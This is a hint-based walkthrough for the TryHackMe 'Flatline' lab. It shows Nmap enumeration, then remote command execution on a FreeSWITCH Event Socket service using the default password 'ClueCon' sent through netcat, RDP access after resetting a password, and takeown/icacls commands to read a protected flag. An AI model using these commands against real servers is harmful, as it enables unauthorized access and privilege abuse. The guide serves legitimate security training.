# Flatline

How low are your morals?

Room: https://tryhackme.com/room/flatline

Walkthrough: https://github.com/garthheff/CTF-Writeups/blob/main/TryHackMe/flatline.md

-------------

## Enumeration

<details>
<summary>Hint 1</summary>

If the target looks down during your first scan, do not assume it is offline. It may simply be blocking ping discovery.

</details>

<details>
<summary>Hint 2</summary>

Try forcing Nmap to scan the target even if host discovery fails.

</details>

<details>
<summary>Hint 3</summary>

Use `-Pn` with your full port scan.

```bash
sudo nmap -Pn -p- --min-rate 5000 -oN nmap-all.txt TARGET_IP
```

</details>

<details>
<summary>Hint 4</summary>

Only a couple of TCP ports should be reachable. One is RDP, and the other is the important service.

</details>

## Service Identification

<details>
<summary>Hint 1</summary>

Do not trust the first service name shown by the fast scan. Run version detection on the open ports.

</details>

<details>
<summary>Hint 2</summary>

Run scripts and version detection against the discovered ports.

```bash
sudo nmap -Pn -sC -sV -p PORTS -oN nmap-service.txt TARGET_IP
```

</details>

<details>
<summary>Hint 3</summary>

The interesting port is not FTP, even if it looks FTP-like at first.

</details>

<details>
<summary>Hint 4</summary>

Look closely for FreeSWITCH `mod_event_socket`.

</details>

## Initial Access

<details>
<summary>Hint 1</summary>

Connecting with an FTP client is not the right approach.

</details>

<details>
<summary>Hint 2</summary>

Use Netcat to connect to the unusual service port.

```bash
nc -nv TARGET_IP PORT
```

</details>

<details>
<summary>Hint 3</summary>

The banner should ask for authentication with a content type style response.

</details>

<details>
<summary>Hint 4</summary>

Research the common default password for FreeSWITCH Event Socket.

</details>

<details>
<summary>Hint 5</summary>

The default password to try is:

```text
ClueCon
```

</details>

<details>
<summary>Hint 6</summary>

After authenticating, test basic FreeSWITCH API commands.

```text
auth ClueCon

api status

api system whoami
```

</details>

## Command Execution

<details>
<summary>Hint 1</summary>

The useful command pattern is `api system`.

</details>

<details>
<summary>Hint 2</summary>

You can send commands through Netcat without typing them manually.

</details>

<details>
<summary>Hint 3</summary>

This is a useful test command.

```bash
printf 'auth ClueCon\n\napi system whoami\n\nexit\n\n' | nc -nv TARGET_IP PORT
```

</details>

<details>
<summary>Hint 4</summary>

Check the current user, hostname, working directory, and token privileges.

</details>

<details>
<summary>Hint 5</summary>

This command gives useful privilege information.

```bash
printf 'auth ClueCon\n\napi system whoami /all\n\nexit\n\n' | nc -nv TARGET_IP PORT
```

</details>

## Desktop Access

<details>
<summary>Hint 1</summary>

RDP is open and may become useful once you control or know the local user account.

</details>

<details>
<summary>Hint 2</summary>

The command execution user is a local Windows account.

</details>

<details>
<summary>Hint 3</summary>

If needed, you can set a password for the compromised local account using command execution.

</details>

<details>
<summary>Hint 4</summary>

You can connect with RDP after setting the password.

```bash
xfreerdp /u:USERNAME /p:'PASSWORD' /v:TARGET_IP /cert:ignore
```

</details>

<details>
<summary>Hint 5</summary>

Check the compromised user’s desktop.

</details>

## User Flag

<details>
<summary>Hint 1</summary>

The user flag is on the compromised user’s desktop.

</details>

<details>
<summary>Hint 2</summary>

Read it from the RDP session or with command execution.

</details>

<details>
<summary>Hint 3</summary>

Example command:

```cmd
type C:\Users\USERNAME\Desktop\user.txt
```

</details>

## Root Flag

<details>
<summary>Hint 1</summary>

The root flag may be visible but not readable from a normal RDP command prompt.

</details>

<details>
<summary>Hint 2</summary>

Your RDP session may not be elevated, even if the account is in the local Administrators group.

</details>

<details>
<summary>Hint 3</summary>

The FreeSWITCH command execution context may have a higher integrity token than your RDP shell.

</details>

<details>
<summary>Hint 4</summary>

Use the FreeSWITCH command execution path to take ownership and update permissions on the protected file.

</details>

<details>
<summary>Hint 5</summary>

The commands you need are `takeown` and `icacls`.

</details>

<details>
<summary>Hint 6</summary>

Example pattern:

```bash
printf 'auth ClueCon\n\napi system takeown /f C:\\Users\\USERNAME\\Desktop\\root.txt\n\napi system icacls C:\\Users\\USERNAME\\Desktop\\root.txt /grant USERNAME:F\n\napi system type C:\\Users\\USERNAME\\Desktop\\root.txt\n\nexit\n\n' | nc -nv TARGET_IP PORT
```

</details>

## Final Notes

<details>
<summary>Hint 1</summary>

The main trick is noticing that the unusual port is FreeSWITCH Event Socket and not FTP.

</details>

<details>
<summary>Hint 2</summary>

The second trick is using the elevated FreeSWITCH context when the RDP shell does not have enough permission.

</details>

<details>
<summary>Hint 3</summary>

The complete path is:

```text
-Pn scan
Service detection
FreeSWITCH Event Socket
Default password
api system command execution
RDP access
Read user flag
Use elevated FreeSWITCH context for root flag
```

</details>
